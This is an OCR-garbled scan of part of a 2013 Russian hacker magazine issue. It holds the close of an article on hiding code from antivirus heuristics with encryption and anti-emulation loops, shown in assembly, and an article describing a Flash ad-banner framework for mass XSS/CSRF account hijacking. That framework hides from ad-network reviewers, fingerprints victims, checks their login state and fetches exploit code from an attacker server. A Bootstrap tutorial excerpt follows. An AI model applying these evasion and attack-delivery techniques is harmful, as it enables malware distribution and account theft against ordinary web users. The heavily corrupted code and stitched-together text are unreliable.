отладчике, для того чтобы в файле сохранился именно зашифро- 
ванный код. 

Результаты опять не изменились. Что ж, некогда эффективные 
и популярные приемы обхода эвристики ныне, похоже, теряют свою 
актуальность. Идем дальше... 



ТЕСТ 7 



Попробуем применить еще один из некогда убойных аргументов — 
использовать антиэмуляционный цикл, по результатам работы 
которого будем определять ключ шифрования. Для этого в начале 
напишем такой код: 

вычисление ключа в цикле 

тоѵ еах, 0РРРРРРРИ 
тоѵ есх, еах 
кеуІоорсіаТа : 
сіес еах 

Іоор кеуІоорсІаТа 
асИ еах, 000000РРЬ 

Без комментариев понятно, что результатом работы этого цикла 
будет появление в регистре еах значения РРЬ, которое мы и ис- 
пользуем в качестве ключа шифрования в надежде на то, что эму- 
лятор из антивируса не будет долго ждать, когда прокрутится этот 
цикл, и, соответственно, не сможет правильно расшифровать код. 

Можно праздновать небольшую победу — только N0032 смог 
до конца прокрутить этот цикл и правильно определить назначе- 
ние проверяемого файла. У «Касперского», несмотря на пропуск 
при сканировании, сработала проактивка, и «вредоносный код» 
запустить не удалось; Соплосіо с завидным постоянством выдал 
такую же реакцию, а М5Е в этот раз сдался полностью. 



Тесты 



Антивирус Сотосіо Іпіегпеі 

Касперского 2012 ЗесигКу Рго 2012 



йг. 1А/еЬ 7.0 



Аѵазі Ргее 
Апііѵігиз 7.0 



Ж)032 5тагі 
Бесигііу 5 



Аѵэбі Ргее МісгозоК ЗесигНу 
АпІіѵігиБ Е$$епІіаІ 5 




сканер 


п/а 

защита 




п/а п/а 

сканер 

защита г защита 


сканер 


п/а 

защита 


сканер 


п/а 

защита 


сканер 


защита 


сканер 


п/а 

защита 


♦ 


♦ 

; ! 


і 


♦ 


♦ 


♦ 


. 

: 




+ 


♦ 




! - Т ♦ 


♦ 


+ 


♦ 


- 


♦ 


♦ 


♦ 


і 


. 




♦ 


1 

♦ 


- 


• і 

+ 


! 

♦ 


♦ 


♦ 




+ 




- 

і і і 






♦ 


1 

♦ 





- * 


♦ 


+ 


+ 


"... ■ 


♦ 

] 


. 

і 1 : 


і 




; 

♦ 


: : 

+ 


- 


- 


! 

♦ 


; 

+ 


♦ 


♦ 




+ 


. 

.... 




' 


+ 


♦ 




- 


♦ 


+ 


+ 


♦ 

•• — 1 


- 


♦ 










! 

♦ 


♦ 




- 


♦ 


♦ 


- 


♦ 

і 


• 


+ 


- 


■ 




- 


♦ 


♦ 




- 


- 


. 


- 


V- 




♦ 


- 




• 


. 

1 


і 

! 


• 

\ ; 





• 


- 


- 



Результаты нашего тестирования 



ХАКЕР 01 /168/2013 








Криптором по антивирусу 



774587С1 
774587С4 
774587С5 
ГГ4?®ГГ ? 
ггдгйг.: •- 
774587С0 
77458701 
77458707 
7745870Я 
77 4 5870С 

774Г 

7741. 
77458; __ 
- ГС'. 
774587Е7 



8В7С24 0С 
885424 88 

С М МТ ■ • 
897Й 84 



ИОи ЫОКО РТК 0$:СЕ0Х].СХ 
РОР ЕОІ 
ЛЕТИ 8 
Р05Н ЕОІ 

мои ЕОІ. ОМОЮ РТЙ 55:СЕ5І>-»ѲСЗ 
мои ЕОХ.ОМОРО РТК 5$іСЕ$Р*8І 
мои ОМОЙО РТР 05: СЕ0Х1.0 

мои оиоро ртр о$:іеохм),еоі 

ОР ЕОІ, ЕОІ 
ОЕ 5Н0РТ 774587РС 
ОР ЕСЖ.РРРРРРРР 
ХОР ЕРХ.ЕЙХ 

РЕРНЕ 5СЙ5 ВѴТЕ РТР Е$:1Е0П 
МОТ ЕСХ 
СМР ЕСХ, 0ГТРР 
— 8Н0РТ 774587Р4 



Ш.ШШ 



Оповеіш 


>ние СОМСЮО Іпіегпеі ЗесигЛу х 






л* 




|1 1 


Іеа 4 ЕХЕ • неопознанный файл, 
изолированный в ЗапгіЬох как Частично 
ограниченное 


1 □ Скрывать эти оповещения Больше не мзолиоовать | 



ѴАКЫШО 



Помни, что 
некоторые 
антивирусы сам 
факт наличия 
шифрования 
кода или данных 
считают достаточно 
весомым признаком 
вредоносности кода. 




Создание ИЗ-таблицы 



Реакция Сотого Іпіегпеі Зесигііу Рго на тест 4 



На компакт-диске 
лежат исходники 
всех тестовых 
заданий для 
антивирусов. 
Готовые бинарники 
заливать на диск мы 
не стали, поэтому 
компилировать 
и допиливать 
код в ОІІуРЬд до 
работоспособного 

Реакция «Антивируса Касперского» на попытку состояния придется 

выполнить код восьмого теста тебе самому. 




Похоже, что антиэмуляционный цикл продолжает оставаться 
эффективным средством противостояния многим антивирусным 
продуктам, но все же, наверное, не единственным. Последняя про- 
верка на прочность... 



ТЕСТ 8 



В этот раз мы используем несколько антиэмуляционных приемов, 
подсмотренных в реальных вредоносных программах (надеюсь, 
их авторы не будут предъявлять мне претензии). Помимо этого, 
мы несколько усложним алгоритм шифрования и будем использо- 
вать разные алгоритмы для секции кода и секции данных. Также, 
посредством антиэмуляционных приемов, будем генерировать раз- 
ные ключи для кода и для данных и, для того чтобы сбить с толку 
счетчик энтропии, добавим в секцию данных несколько фейковых 
строк, которые не будут подвергаться шифрованию. 

Итак, что мы имеем внутри проверочного кода для последнего 
теста: 

Первый антиэмуляционный прием 

іпѵоке БеНазТЕггог, 1 

Ье§іпап*іети1_1: 

іпѵоке СеіІ_а5іЕггог 

стр еах, 1 

З’Ье епсІапііети1_1 

Зтр Ье§іпапі:іети1_1 

епс!апі:іети1_1: 

Второй антиэмуляционный прием (примерно такой же 
используется в ВасксІоог.ИіпЗг.ІКСВоі.асІНѵ) 

іпѵоке 1_оас11ЛЬгагу, МзСаіЗгоШате 

іпѵоке СеіРгосАсІсІгеББ, еах, [СгуріСАТОрепОгсІ] 

рІІБЙ 0 

риБН Ѳ 

РіібЬ Ѳ 

ріІБМ 0 

ри$Ь 0 

саіі еах 

зиЬ еах, -1 

З'е епс!апііети1_2 

іпі 3 

епс!апііети1_2: 

Получение ключа для расшифровки секции данных 
по результатам работы АРІ-функций ОрепРгосеББ и СгеаіеРіІе 



іпѵоке ОрепРгосеББ, РК0СЕ55_АІ_1__АССЕ55, 0, 0РРРРРРРРИ 
тоѵ есх, [еэр - 1СН] 

Ьзмар есх 
тоѵзх есх, сі 
зиЬ есх, 045Ь 
тоѵ [КеуСгурі], есх 

іпѵоке СгеаіеРіІе, №те!лІіпсІои, 80Ѳ000Ѳ0Ь, 0, 0, ЗИ, 0 
асісі [КеуСгурі], еах 

Полный код для этого теста ищи на диске, надеюсь, ты раз- 
берешься с ним без всяких проблем. Единственное, что стоит 
отметить, — в связи с тем что мы немного усложнили алгоритм 
шифрования секции данных (помимо ХОР, добавили еще и вы- 
читание), возникает необходимость после прогона всех циклов 
шифрования в отладчике и сохранения зашифрованных секций 
в файле заменить строки 

хог Ы, Ьуіе [КеуСгурі] 
зиЬ Ы, сі 

на конструкцию вида: 

асісі Ы, сі 

хог Ы, Ьуіе [КеуСгурі] 

В итоге всех этих манипуляций с кодом мы получили файл, 
реакции на который при сканировании ни от одного антивируса 
не последовало, проактивка «Касперского» вяло отметила, что 
код похож на вредоносный, и не помешала исполнить задуманное, 
ну а Сотого остался верен своим принципам блокировать всех 
и вся и запретил выполнение. 



ЗАКЛЮЧЕНИЕ 



Что я слышу? Кто-то сказал, что тест плохой? Что в тесте ис- 
пользуется специально написанный код без явного вредонос- 
ного функционала? Спрашивали — отвечаем! Во-первых, этот 
код очень подозрительный. Мы бы даже сказали, что он просто 
классически подозрительный. Такой код должен палить каждый 
антивирус, и результаты первого теста прямо показывают — да, 
антивирусы его распознают как подозрительный. А результаты 
последующих тестов так же недвусмысленно показывают, что 
наши небольшие усилия вполне способны скрыть этот ранее 
считавшийся подозрительным код от внимания антивирусов. Так 
что все честно! □□ 



ХАКЕР 01 /168/2013 



085 







МАІЛЛ/АКЕ 



Кирилл Самосадный 
Андрей Петухов ІІѵѵіІІег.сот/рЗіамЛ 




Доклад 



_ 






С5Кг 



В ШСЕЬЩ 



ФРЕЙМВОРК ДЛЯ 
ПРОВЕДЕНИЯ 
МАССОВЫХ АТАК 
ЧЕРЕЗ БАННЕРНЫЕ 
СЕТИ 



Как всем известно, реклама — двигателыорговли, а реклама в интернете — самый бы- 
строрастущий сектор рекламной деятельности. Ежедневно при серфинге в Сети каждый 
ее пользователь видит множество рекламных баннеров различной формы и содержания: 
от простых текстовых объявлений до больших анимированных роликов. Последние чаще 
всего создаются с помощью технологии АсІоЬе РІазЬ, которая поддерживается практически 
всеми целевыми устройствами. Сейчас речь пойдет о том, как легко можно злоупотребить 
сервисом баннерообменных сетей для реализации массовых атак. 



ВВЕДЕНИЕ 



Все знают про Х55, С5ВР, Х55 оѵег С5ВР (особенно в админках] 
и про схемы монетизации нецелевых атак на сайты. Еще все 
знают про бгіѵе-Ьу боѵѵпіоасі атаки, а также про отличный транс- 
порт для них в виде баннерных сетей (см. статью на Хабре от Петра 
Волкова из Яндекса: ЬаЬгаЬаЬг.ги/ро 5 і/ 143345 І. 

В методике оценки рисков есть такое понятие — дар апаіузіз: 
речь идет про анализ неравномерности покрытия аналитикой не- 
которой области. Мы сделали такой для области «нетаргетирован- 
ные атаки через баннерные сети». 

Данная статья не содержит готовых эксплойтов или описания 
уязвимостей. Речь пойдет о том, как автоматизировать процесс 
эксплуатации уже найденных уязвимостей еп таззе. 

Итак, идея крайне проста. Коль скоро: 

• нецелевые атаки преследуют массовость; 

• целью атак является получение некоторого монетизируемого 
ресурса; 

• баннерныесетиобеспечиваютмассовостьдоставки контента 
конечному потребителю, тоатаки на ЦАчерез них — то, что надо! 



ОК, ты спросишь меня, а что же надо? Отвечу: 

• угон акков через Х55/СБРР/Х55 оѵег С5РР; 

• угонадминокчерезтожесамое. 

При этом хотелось бы: 

• избежать обнаружения на этапе проверки баннера админом 
баннерной сети; 

• как можно дольше не палить вредоносное поведение баннера 
при показах; 

• если обнаружат, отдать как можно меньше информации об экс- 
плуатируемыхуязвимостях и общей схеме работы. 

В идеале хотелось бы получить следующий ѵѵогкНоѵѵ: 

Этап 1. Добавляем баннер в баннерообменную сеть и оплачиваем 
показы. Баннер попадает к админу на проверку. Здесь баннер должен 
каким-то образом (каким — читай далее) понять, что его проверяют, 
и отказаться от демонстрации подозрительного поведения. 

Этап2. Баннерзапускается в ротацию. Долго ли, коротколи — бан- 
нер показывается очередному посетителю некоторого сайта, явля- 



086 



ХАКЕР 01 /168/2013 





С5ПР в массы! 



ющегося участником баннерной сети. На этом этапе баннер, по идее, 
должен взятьи реализовать заданную атаку в отношении бедолаги. 

Однако, если хорошенько призадуматься над задачей, должны 
возникнутьнекоторые вопросы: 

1. Какую именно атаку необходимо провести? Неужели мы долж- 
ны определиться сатакой до добавления баннера в ротацию 

и заранее вшить в файл эксплойт? Не очень-то удобно. В идеале 
хотелосьбыузнаватьотом, какиеатаки проводить, вреальном 
времени — в момент показа. 

2. А входит ли текущий посетитель в целевую аудиторию нашей 
массовой атаки? Не хотелось бы палить вредоносное пове- 
дение при каждом показе. Получается, что, помимо динами- 
ческой конфигурации запускаемыхэксплойтов, надо пред- 
усмотреть некую подсистему фингерпринтинга, которая и даст 
ответ на вопрос «бить или не бить?». 

Перед тем как ответить на заданные вопросы и рассказать 
о деталях реализации такого фреймворка, предлагаю вспомнить 
несколько важных фактов из жизни РІазЬ. 

Как известно, каждое РІазЬ-приложение выполняется в изоли- 
рованной среде, но может взаимодействовать с другими ресурса- 
ми, если они дают на это разрешение. Частным случаем подобного 
ресурса является НТМЬстраница, в которую встроен РІазЬ-объект, 
а разрешение на взаимодействие с ней контролируется атрибутом 
АІІоѵѵБсгіріАссезз в соответствующем теге: 

<оЬзеск сІа-Са=Че5*_Ла5Ьѵаг5.5ѴугР" *уре=— 
"арр1іса*іоп/х-5Ьоскшаѵе-ЯазЬ" ісІ= ,, Яа5Ь_35357516" - 
місИИ*"320 м Ьеі§Ы:="180"> 

<рагат пате="Яа5Ьѵагз" «-* 

ѵа1ие= ,, пате1=ѵа11&атр;пате2=ѵа12&атр;пате3=ѵа13"> 
<рагат пате="тоѵіе" ѵаІие^'-Сез^ЯазЬѵагз.зѵѵГ'» 

<рагат пате="мтос1е" ѵа1ие="орацие"> 

<рагат пате="А11ои5сгір1:Ассе55" ѵа1ие="РІЛ ІТ НЕКЕ"> 
</оЬ]'ес*> 

Атрибут АІІоѵѵБсгіріАссезз может принимать три значения: 

• затеОотаіп (значение поумолчанию) — страница и РІазЬ- 
приложение могутвзаимодействоватьтолько втом случае, 
если они находятся в одном домене (согласно БОР); 

• пеѵег — взаимодействие запрещено; 

• аіѵѵауз — взаимодействие разрешено внезависимости от до- 
менов. 

У тебя может возникнуть справедливый вопрос: а что подраз- 
умевается под взаимодействием РІаэЬ-объекта и НТМЬстраницы, 
которая его включила? В АсІіопБсгірІ 3.0 определен специальный 
класс Ехіегпаііпіегіасе, который позволяет: 

1. ИзРІазЬ-приложения выполнить ЗаѵаБсгірІ-код в контексте 
страницы: 

Ех*егпаШп1:егЯасе.са11("а1ег*", 1 ); 

2. Установить саІІЬаск 'и для обратной связи (то есть из ЗаѵаБсгірІ 
можно дернуть функцию на АсІіопБсгірІ, реализованную 

в РІазЬ-объекте): 

Ех*егпа11Іп*егРасе.асІсІСа11Ьаск("са11Ьаск", 4-. 

5 оте_а з__-Ри п сС і оп ) ; 

Вызов из 35 будет таким: 

<зсгір1:> 

Ьоситепі: [ ' ЯазЬ_35357516 ' ] . са11Ьаск( ) ; 

</зсгір1:> 

а для ІЕ: 





ЬіШКВЕЙі- 

о детектировании 
атак типа сігіѵе-Ьу 
сіоѵ/піоасі и 
новых векторах 
распространения 
вредоносного ПО 
через РІазЬ-баннеры. 

ИДЯ 

На нашем диске 
ты сможешь найти 
все необходимые 
файлы и исходники. 

Вся информация 
предоставлена 
исключительное 
ознакомительных 
целях. Ни редакция, 
ни авторы не несут 
ответственности за 
любой возможный 
вред, причиненный 
материалами данной 
статьи. 



<зсгір*> 

шіпсіоѵѵ[ , ЯазЬ_35357516' ] .са11Ьаск(); 

</зсгірІ:> 

Таким образом, при значении атрибута АІІоѵѵБсгіріАссезз = 
аіѵѵ/ауз РІазЬ-объект может модифицировать йОМ страницы 
(внедрять в страницу другие объекты, скрипты), отправлять ХНВ- 
запросы и считывать ответы в соответствии с БоР включающей 
страницы, а также отправлять запросы без возможности считыва- 
ния ответов на другие домены (СБРР-стайл). 

ОК, ликбез ликбезом, а что там с баннерными сетями и значе- 
нием этого атрибута в них? Там все страшно. Дело в том, что код 
вставки баннера на страницу обычно генерируется скриптами 
баннерообменной сети, и администратор сайта, на котором разме- 
щается реклама, обычно не влияет на него (не понимает, не хочет, 
ѵѵЬаІеѵег). Более того, в некоторых сетях взаимодействие между 
страницей и баннером (АІІоѵѵБсгіріАссезз = аіѵѵауз) является не- 
обходимым для подсчета количества показов. 

Итак, к делу. Пусть у нас есть НТМЬстраница и встроенный 
баннер, у которого АІІоѵѵБсгіріАссезз = аіѵѵауз. Нам надо решить 
несколько задач: 

1. Не спалить подозрительное поведение админу баннерной сети. 

2. Сделать так, чтобы атаки конфигурировались во время показа 
баннера. 

3. Реализовать фингерпринтинг клиента с целью отнесения его 
к целевой аудитории атаки. 



[ОПРЕДЕЛЕНИЕ ПОКАЗА АДМИНУ БАННЕРНОЙ СЕТИ 



Перед хакером стоят две подзадачи. Первая — определить, 
что баннер находится на проверке, и успешно ее пройти. Вто- 
рая — определить, что баннер пытаются исследовать, и за- 
труднить анализ. Перво-наперво хакер разбивает вредоносный 
баннер на две части: одна будет показывать рекламу и выполнять 



ХАКЕР 01 /168/2013 




МАІ.ѴѴАКЕ 



проверку на показ админу, а вторая будет непосредственно вре- 
доносной. 

Конечно, под каждую баннерообменную сеть хорошо бы напи- 
сать свою проверку, чтобы обеспечить неактивность вредоносного 
поведения в браузере администратора. Мы попытались выделить 
несколько общих критериев, которые могут сгодиться для реали- 
зации описанных проверок. 

1. Отсутствие подстроки «асітіп» в адресе НТМЬстраницы. 
Получить ІІКІ. страницы можно с помощью следующего кода: 

ЕхіегпаІІпіег-Расе.саІІ— 

(”еѵа1" л "сіоситепі. Іосаііоп.Ьге-Р"); 

2. Отсутствие пересечений в доменных именах включающего 
документа и адреса баннера. Например, при показе на 
Ыір://асітіп.Ьаппег.сот/асітіп.рЬр и загрузке объекта с адреса 
Ыір://(Л.Ьаппег.сот/Ьаппег.рЬр?ісі=123 надо вести себя потише. 
Помни, что баннер можетбыть добавлен через Кгате, поэтому 
адрес включающего документа надо получатьсумом. 

3. Адрес включающего документа — домен первогоуровня. Это 
нужно для исключения демонстрации вредоносного поведе- 
ния при открытии из локальной сети. 

4. Адрес включающего документа — доменное имя, а не ІР-адрес. 
Аналогично предыдущему. 

Плюс конвертирование анимации в А5-код сильно затруднит 
визуальный поиск «лишнего» кода. 



ДИНАМИЧЕСКОЕ КОНФИГУР ИРОВАНИЕ 
АТАКУЮЩЕЙ I Іи I І 'і 111^— 



Предположим, что все проверки прошли успешно. Теперь надо вы- 
полнить вредоносный код. Делать этот код встроенным непосред- 
ственно в баннер невыгодно по нескольким причинам: 

• при необходимости изменить полезную нагрузку баннер надо 

будетзаново добавлять в баннерообменную сеть; 

• при первом же обнаружении подозрительной активности будет 

обнаружен весьвредоносный код. 

Мы приходим к необходимости в еще одном РІазІѵобъекте, 
который будет загружаться с подконтрольного нам сервера и об- 
ладать всей необходимой нам нагрузкой. В логику этого объекта 
мы включили проверку пререквизитов атаки и непосредственно 
реализацию атаки. 

В общем случае проверка пререквизитов атаки — это некий 
ЭБ-код, который заранее вкомпиливается в РІазЬ-объект и за- 
пускается через ЕхІегпаІІІпІегІасе.саІіС'еѵаГ, код), а после своего 
выполнения сообщает серверному скрипту результаты проверки. 
Например, пререквизитом атаки может быть залогиненность поль- 
зователя на заданном сайте. Как можно определить, залогинен ли 
пользователь на сайте, читай тут: Ы Иѵ.сот/БЕГвдс . а также смотри 
пример кода ниже. 

Ехіегпа1ІпіегРасе.ас1(1Са11Ьаск("сЬеск" л сЬеск); 
сЬескІізі = пей Аггау( м ѵаг і = пей Ітаее(); і.ісі = — 

\ ' -Р1а523с7с35сІсе-Р2е774508сЗЬееі000\ ' ; і.опіоасі = - 
іипсііоп(){і = сіоситепі. ееіЕ1етепіВуІс1( Ѵі1а523с7с35<1— 
сеі2е774508сЗЬееі000\' ); і.рагепіМосІе. гетоѵеСНіІсІ(і); — 
<<іс1>>.сЬеск(1); }; і.опеггог = іипсііоп(){і = «-* 
сіоситепі . §еіЕ1етепіВуІсІ( \ ' і1а523с7с35с!се-Р2е774508сЗЬее— 
Р000Ѵ); І.рагепіМосІе. гетоѵеСНіІсІ(і); <<іс!>>.— 
сЬеск(0); }; і.згс = \'ІП:ірз://ассоипіз.§оо§1е.сот/.-' 
СИескСоокіе?сопііпие=Ніір5 : //иѵм. §оо§1е . сот/іпіі/еп/— 
іта§е5/1о§оз/ассоипі5_1о§о.рп§?У + МаіН.гапсІот();" л 

"ѵаг і = пем Ітаве(); і.ісі = V •Р1а523с7с35сісе1 : 2е774508- 
сЗЬееР00Ѳ\’ ; і.опіоасі = іипсііоп( ){і = сіоситепі.— 
§еіЕ1етепіВу!сІ(\ ' і!а523с7с35сІсеі2е774508сЗЬееі000\ ' ) ;- 



І.рагепіМосІе. гетоѵеСЬіІсІ(і); <<ісІ>>.сИеск(1); }; — 
і.опеггог = -Рипсііоп(){і = сіоситепі. §еіЕ1етепіВуІсІ— 

(\ ’ ■Еіа523с7с35сІсеі2е774Б08сЗЬееі000\ 1 ) ; і . рагепіМосіе .- 
гетоѵеСЬіІсІ(і) ; <<іс!>> . сЬеск(0) ; }; і.згс = ѴЬіірз://- 
ріиз . §оо§1е . сот/ир/ ?сопііпие=Ьіірз : //ѵлм . §оо§1е . сот/іпіі/— 
еп/іта§е5/1о§о5/ассоипі5_1о§о.рп§&іуре=5і&§р$гс=о§ру0&\'— 
+ МаіЬ.гапсІот();"); 

іі (СараЬіІіііез.рІауегТуре == "АсііѵеХ") ісі = — 
И міпсІом['" + ЕхіегпаІІпіег-Расе.оЬзесіЮ + 
еізе ісі = "сіоситепі [ '" + ЕхіегпаІІпіегРасе.оЬіесіЮ + 

■Рог (ѵаг зі : 5ігіп§ іп сЬескІізі) { 
Ехіегпа1Іпіег-Расе.са11("еѵа1 И л сИеск1ізі[зі] .— 
гер1асе("<<ісІ>> ,, л ісі);); 

} 

Итак, результаты проверки пререквизитов атак отсылаются 
обратно на сервер, который выдает код для проведения только 
актуальных атак: 

-Рипсііоп геасЮаіа(е : РговгеззЕѵепі) : ѵоісі { 
Ехіегпа1ІпіегРасе.са11("еѵаГ', — 
зоскеі . геасИІТЕВуіез( зоскеі . ЬуіезАѵаіІаЬІе) ); 

> 

Заметим, что хранение кода, эксплуатирующего уязвимости, 
на подконтрольном ресурсе позволяет проводить дополнительные 
проверки каждого клиента, например по ІР-адресу. 



ФИНГЕРПРИНТИНГ КЛИЕНТА 



Еще одна задача — провести фингерпринтинг клиента. На данную 
тему выпущено много статей и научных работ, к которым мы тебя 
и отсылаем. В нашем же фреймворке мы реализовали только про- 
стейшие проверки. 

Чтобы установить, что наш баннер просматривается 
не человеком и не под обычным браузером, мы следим: 

а) за наличием перемещений мыши на включающей странице 
(событие оптоизетоѵе); 

б) за наличием НТМ1.5-интерфейсов (например, ІосаІБіогаде); 

в) затипом плеера (зіапсіаіопе или в браузере), а также за его 
режимом работы — см. кодниже. 

СараЬіІіііез.рІауегТуре == Р1и§Іп || — 
СараЬіІіііез.рІауегТуре == АсііѵеХ 
СараЬіІіііев.ІБОеЬивеег == Раізе 



ЗАКЛЮЧЕНИЕ 



Общая схема работы предлагаемого фреймворка, код которого 
ты найдешь на диске, отражена на соответствующем рисунке. Вот 
основные компоненты фреймворка: 

1. Один или несколько баннеров, которые выполняютфингер- 
принтинг клиента (и админа) и загружают вредоносное РІазІѵ 
приложение с сервера. 

2. .ІаѵаБсгірІ-код, который проводитпроверку возможности экс- 
плуатацииуязвимостей. Проверки нужны, например, длятого, 
чтобы определитьуязвимостьПО клиента кэксплойтуили 
узнать, залогинен ли пользователь на уязвимом к С5РР сайте. 

3. Серверный скрипт, которомуотсылаются результаты проверки 
пререквизитоватак и который возвращаетЭБ-код, непосред- 
ственно эксплуатирующий уязвимости. 

4. Вредоносный РІазЬ-баннер, который содержит ЭБ-код из п. 2, 
а также запускает 35-код эксплойтов, полученный от сервер- 
ного модуля из п.З. 

В качестве заключения хотелось бы порекомендовать всем 
администраторам сайтов внимательнее изучать технологии, 
использующиеся для вставки внешнего контента в страницы их 
сайтов, ю 



088 



ХАКЕР 01 /168/2013 






Ргеѵіеѵѵ 



ІШІХОІО 



108 



ИСПОЛИН, КАКИХ НЕМНОГО 

Бузіетсі — новая система инициали- 
зации, уже используемая по умол- 
чанию во многих современных 
дистрибутивах. Увы, линуксоиды 
плохо реагируют на стандартизацию, 
и многие восприняли новое детище 
Леннарта Поттеринга в штыки. 

В конечном счете этот человек 
уже подарил миру РиІзеАисІіо, и, 
что характерно, реакция хардкорных 
линуксоидов была точно такая же. 

Однако прежде, чем гуглить ин- 
струкцию по выпиливанию зузіетс! 
из любимого Арчика, почитай этот 
анализ, чтобы понять — а есть ли 
поводы для драмы? 




ІІШХОШ 



кодинг 




ЧТОНАМСТОИТТУКСАВСТРОИТЬ 




ШВЕЙЦАРСКИЙ НОЖДЛЯШ 




Изучаем платформу ОрепЕтЬесІсІесі 


90 


Создаем сайты с адаптивной версткой 


96 


для реализации различных проектов во 




и другими вкусностями с помощью ТѵѵіПег 





встраиваемыхустройствах. ВооЫгар. 



СТАНЬ РОБОТОТЕХНИКОМ! 

Обзор возможностей среды для програм- 
мирования роботов МісгозоК РоЬоіісб 
Оеѵеіорег Біисііо. 



БУ N /АС К 



РЕККІІМ 




122 



ПОПУРРИ 

Продолжаем изучать новшества ѴѴіпсІоѵѵз 
Бегѵег 2012— на этотраз речь пойдет 
оменеезаметных нововведениях. 



126 



ЛИЦОМ К ЛИЦУ 

Обзор аппаратных и программных реше- 
ний для организации видеоконференций 
на предприятии. 



132 



ІАРЦРІАРО^ 

Сравнительный обзор геймерских 
материнских платдля платформы АМй 
ВиІІсІогег. 



ХАКЕР 01 /168/2013 



089 















щейТисриЫор 

Ш ЬХОЕсЯеЛЯ 



кодинг 



Игорь «5рісІег_МЕТ>» Антонов ІапІопоѵ.ідог.кЬѵВдтаіІ.сот, ѵг-опііпе.ги) 
Илья Курченко (кигсИепкоОгеаІ. хакер. ги) 









И 










ЗНАКОМИМСЯ с ТѴѴІТТЕК &00Т $Т Р АР С *!"*™ * 



ШЛА 



'ПОЧТА 



НоН&Р Телефона 



О (І0іиелс.П(гТЬ 
О П еш-е-к ГуЛ&Ть 




Прошло чуть больше года с момента первого 
релиза Тѵѵіиег ВооЫгар. За год этому про- 
екту удалось стать настоящей рок-звездой: 
он взорвал сердца веб-разработчиков по всему 
миру, собрал вокруг себя нешуточного размера 
сообщество, вдохновил единомышленников 
на создание форков и занял почетное место 
на Олимпе инструментов веб-разработки. 

КТО ТАКОЙ, ЧЕМ ЗНАМЕНИТ? 

Тѵѵіиег ВооЫгар — бесплатный и свободный набор инструментов 
для создания веб-приложений (сайтов) любого масштаба. Весь 
ВооЫгар по большому счету — это набор НТМ1_/С55А)5-файлов, 
код которых решает самые разнообразные задачи, возникающие 
перед разработчиком. Например, в Тѵѵіиег Вооізігар из коробки 
доступны НТМІ_/С55-шаблоны оформления для веб-форм, кнопок, 
главного меню и так далее. 



ЗАЧЕМ ПОЛЬЗОВАТЬСЯ С55-ФРЕЙМВ0РКАМИ? 

Вполне резонный вопрос. Действительно, зачем заморачивать- 
ся изучением каких-то «гламурных» инструментов, если у тебя 
проблем с версткой/разработкой и так нет? Аргумент вроде «там 
есть куча готовых кусков кода» звучит не совсем убедительно, 
поскольку у любого девелопера с опытом работы явно имеется 
свой набор проверенных временем заготовок. Так в чем же тогда 
профит от применения Тѵѵіиег Вооізігар и ему подобных? Отвечаю 
по пунктам. 

Во-первых, заготовка заготовке рознь. Не хочу кого-то обидеть, 
но по опыту скажу, что на каждое правильное решение обязательно 
найдется еще более правильное. Так ужустроен человек: потратив 
время и найдя рабочий вариант, вбольшинствеслучаевон неза- 
хочетискатьи рассматриватьальтернативныеточкизрения. Пусть 
даже найденный первоначальный вариантне идеален — главное, 
он работает, а остальное никого не касается. Сам понимаешь, что та- 
кой подход не самый верный и по-хорошему нужно всегда стремить- 
ся к совершенству. 

Фреймворки не обходят этот вопрос стороной. «Но ведь их код 
тоже может быть далек от идеала!» — справедливо возразишь ты. 
Популярные фреймворки (например, тот же ВооЫгар от Тѵѵіиег) 



090 



ХАКЕР 01 /168/2013 



Швейцарский нож для III 



имеют развитые сообщества, состоящие из опытных разработчи- 
ков, которые следят за качеством кода и не скупятся вносить свои 
предложения. Если предложенный кем-то вариант решения опре- 
деленной задачи круче, то его обязательно внесут в новую версию 
дистрибутива, и он станет доступен всем девелоперам. Таким 
образом, код твоих проектов будет всегда свежим и отфильтрован- 
ным от всяких архаизмов. Ведь даже сейчас, несмотря на богатые 
возможности НТМІ_5/С553, многие веб-разработчики продолжают 
делать красивые кнопочки в виде картинок. 

Быстрое прототипирование интерфейса будущего приложения. 
Ни для кого не секрет, что в большинстве случаев программисты 
рьяно берутся за написание кода нового проекта, а потом долго и му- 
чительно пытаются сделатьудобный и приятный для восприятия 
интерфейс. И если еще продумать его концепцию по силам многим 
кодерам, то сотрисовкой элементовубольшинства возникаютпро- 
блемы. Вотвтакихслучаяхпомощьфреймворка будет просто неза- 
менимой, поскольку в нем имеется все необходимое, чтобы создать 
нормальный интерфейс без л ишних усилий. Туттебе и симпатичные 
кнопки, и оформленные элементы ввода, и много чего еще. Поверь, 
результатты получишь лучше (а главное — быстрей), чем если 
ты начнешьвседелатьсамостоятельно(особенноеслинапрочьот- 
сутствуютнавыки рисования). 

Стандартизация интерфейса. Верстальщики и дизайнеры не- 
редко орут благим матом и возмущаются, что все разработанные 
на фреймворках сайты выглядятодинаково. Мол, нефигзаполонять 
Сеть кучей проектов со схожим внешним видом. Отчасти это утверж- 
дение справедливо, но почему-то эти ярые противники забывают, 
что применение в проекте фреймворка не мешает дизайнеру создать 
уникальный шедевр. Все элементы могутбыть перерисованы 
и выполнены втаком стиле, который только может придумать из- 
вращенный мозгхудожника. При детальном изучении предмета 
внести изменения— дело нескольких часов (я имею в виду полную 
перерисовку базового оформления). Разработчики фреймворка 
этого не запрещают, а даже, наоборот, поощряют. 

Кроме возможности создавать простые и стильные интерфей- 
сы для веб-приложений, ТѵѵіІІегВооІзІгар предлагаетнам еще 
одно очень важное и неоспоримое преимущество — возможность 
быстро и без лишних хлопот создать полностью адаптивный дизайн 
для твоего сайта. Можно сколько угодно спорить о том, что луч- 
ше— отзывчивая верстка, специально разработанная статичная 
мобильная версия или вообще нативное приложение для платфор- 
мы, но факт остается фактом: зачастую у разработчиков просто нет 
ни времени, ни ресурсовдлятого чтобы делать отдельную версию 
сайта для смартов, не говоря уже о нативном приложении. В этих 
случаях ВооЫгар — это идеальное решение, позволяющее верстать 
практически без лишней работы и одновременно получить сайт, 
оптимизированный подо все разрешения экранов и даже подстраи- 
вающийся в реальном времени под ресайз окна браузера. Немного 
путано? Просто открой главную страницу проекта на гитхабе І Ьіі.іѵ/ 
д 269Мт ) и постепенноуменьшай ширину браузера. Выглядит здоро- 
во, не правда ли?Тогда перейдем отслов кделу и попробуем сделать 
свой проектна ВооЫгар. 

РЕАОѴ? 5ЕТ? 60! 

Загрузив сам архив с фреймворком, первым делом необходимо 
подключить нужные файлы к проекту. Содержание архива Вооізігар 
втекущей версии 2.2.2такое: 

/ 

|— С55/ 

| | Ьоог$1гар[ .тіп] .сзз 

